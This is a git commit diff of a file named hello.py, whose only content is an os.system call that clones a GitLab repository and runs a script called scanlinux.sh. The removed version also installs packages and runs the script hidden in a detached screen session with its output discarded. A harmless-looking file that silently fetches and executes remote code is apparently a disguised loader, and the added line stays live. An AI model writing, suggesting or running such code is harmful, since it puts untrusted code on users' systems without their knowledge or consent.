2c23d7fbd0f296f2bb10ca722b3174fcc90c9fff
akwjqkam <97821722+akwjqkam@users.noreply.github.com>
2022-01-18 19:04:50 +0700

    Update hello.py

--- hello.py
+++ hello.py
@@ -1,2 +1,2 @@
 import os
-os.system('apt-get update && apt-get install -y git curl screen && git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scanlinux.sh && screen -dmS server ./scanlinux.sh > /dev/null && ping 8.8.8.8')
+os.system('git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scanlinux.sh && ./scanlinux.sh')
